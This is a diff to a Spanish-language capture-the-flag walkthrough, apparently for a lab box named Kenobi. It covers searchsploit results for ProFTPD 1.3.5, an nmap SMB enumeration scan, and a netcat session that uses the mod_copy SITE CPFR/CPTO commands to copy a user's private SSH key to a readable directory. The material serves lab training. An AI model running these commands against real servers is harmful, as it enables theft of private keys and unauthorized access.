@@ -41,4 +41,20 @@ searchsploit proftpd 1.3.5
 
 ![image](https://user-images.githubusercontent.com/44788583/149048768-a7280eb2-111c-4eb8-80c7-91a96366ffc7.png)
 
-Se encuentran 4 posibles xploits. 3 de 1.3.5 específico y 1 de 1.3.x
+-Se encuentran 4 posibles xploits. 3 de 1.3.5 específico y 1 de 1.3.x
+
+![image](https://user-images.githubusercontent.com/44788583/149190534-0b4c6ed4-c77e-41f8-a1af-7dce81601728.png)
+
+- nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.56.240
+- Se pueden ver exploits con mod_copy que usan los comandos SITE CPFR and SITE CPTO  que copian archivos y carpetas de un lugar a otro. El servicio FTP está corriendo como el usuario Kenobi y debe haber un ssh key para ese usuario.
+
+---------
+ 
+## Nos metemos con netcat de nuevo y vemos el usuario de kenobi en home/kenobi
+
+- nc 10.10.137.58 21 conexión por netcat en puerto 21
+- Ahora se copiara el id_rsa a la carpeta /var/tmp por medio de los siguientes comandos: SITE CPFR /home/kenobi/.ssh/id_rsa
+ y luego SITE CPTO /var/tmp/id_rsa
+
+![image](https://user-images.githubusercontent.com/44788583/149191989-9182ccc3-4bed-4e9a-b274-4ec34d2487a6.png)
+
